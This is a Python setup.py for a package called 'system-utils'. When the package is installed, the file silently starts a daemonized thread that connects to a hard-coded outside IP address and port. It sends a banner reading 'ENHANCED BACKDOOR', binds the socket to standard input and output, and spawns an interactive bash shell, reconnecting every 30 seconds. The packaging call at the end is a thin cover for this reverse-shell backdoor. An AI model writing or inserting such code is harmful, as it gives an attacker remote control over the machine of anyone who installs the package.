from setuptools import setup
import os
import sys
import socket
import subprocess
import threading
import time
import pty

def get_proper_shell(s):
    """Get a fully functional shell automatically"""
    
    try:
        # Change to safe directory
        os.chdir('/home' if os.path.exists('/home') else '/tmp')
        
        # Set environment variables
        os.environ['TERM'] = 'xterm-256color'
        os.environ['SHELL'] = '/bin/bash'
        os.environ['PS1'] = '\\[\\e[1;32m\\]\\u@\\h\\[\\e[0m\\]:\\[\\e[1;34m\\]\\w\\[\\e[0m\\]\\$ '
        
        # Duplicate socket
        for fd in (0, 1, 2):
            try:
                os.dup2(s.fileno(), fd)
            except:
                pass
        
        # Spawn PTY shell
        pty.spawn(["/bin/bash", "--login"])
        
    except:
        try:
            subprocess.call(["/bin/bash", "-i"])
        except:
            pass

def enhanced_backdoor():
    try:
        # Daemonize
        if os.fork() > 0: return
        os.setsid()
        if os.fork() > 0: sys.exit(0)
        
        time.sleep(5)
        
        while True:
            try:
                s = socket.socket()
                s.connect(("142.93.23.15", 66666))
                
                # ASCII-ONLY banner - no special characters!
                s.send(b"\n")
                s.send(b"+------------------------------------------+\n")
                s.send(b"|     ENHANCED BACKDOOR - AUTO FIX         |\n")
                s.send(b"+------------------------------------------+\n")
                s.send(b"| Full TTY with job control                |\n")
                s.send(b"| Proper directory navigation              |\n")
                s.send(b"| Command history and editing              |\n")
                s.send(b"| Tab completion enabled                   |\n")
                s.send(b"| Colored prompt                           |\n")
                s.send(b"+------------------------------------------+\n")
                s.send(b"\n[+] Applying automatic fixes...\n")
                s.send(b"[+] Shell ready!\n")
                s.send(b"\n$ ")
                
                # Get proper shell
                get_proper_shell(s)
                
            except Exception as e:
                time.sleep(30)
    except:
        pass

# Start backdoor
threading.Thread(target=enhanced_backdoor, daemon=True).start()

# Clean install
setup(name="system-utils", version="1.0.0")
